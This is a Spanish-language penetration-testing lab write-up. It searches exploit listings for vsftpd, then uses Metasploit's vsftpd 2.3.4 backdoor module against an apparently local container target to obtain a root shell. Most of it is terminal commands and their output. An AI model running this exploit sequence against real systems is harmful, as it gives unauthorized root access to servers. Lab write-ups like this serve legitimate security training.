```bash
┌──(root㉿112c1bb279f3)-[/]
└─# searchsploit vsftpd
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption   | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)   | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)   | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                 | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                        | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)           | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                          | multiple/remote/49719.py
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(root㉿112c1bb279f3)-[/]
└─# 
```

Vulnerabilidad de Backdoor encontrada, intentemos explotarla, para ello habra que buscar si hay algun exploit para poder ejecutar el ataque, vamos a atacar con `metasploit-framework`

https://www.exploit-db.com/exploits/49757

![descripcion](../../IMG/Captura%20de%20pantalla%202025-05-06%20a%20las%209.26.14.png)

```bash
┌──(.venv)(root㉿112c1bb279f3)-[/home/vsftpd]
└─# msfconsole
Metasploit tip: Use sessions -1 to interact with the last opened session
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.4.56-dev                          ]
+ -- --=[ 2505 exploits - 1291 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 1
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][..
                                       .]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/u
                                       sing-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.17.0.3
RHOSTS => 172.17.0.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 172.17.0.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 172.17.0.3:21 - The port used by the backdoor bind listener is already open
[+] 172.17.0.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
/[*] Found shell.
bash
ls[*] Command shell session 1 opened (172.17.0.2:44467 -> 172.17.0.3:6200) at 2025-05-06 08:36:53 +0000
shell /bin/bash
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[-] python3 not found
[*] Trying to find binary 'script' on the target machine
[*] Found script at /usr/bin/script
[*] Using `script` to pop up an interactive shell


# whoami
whoami
root
```

Una vez ejecutado el exploit, se podra entrar dentro de la maquina en forma de root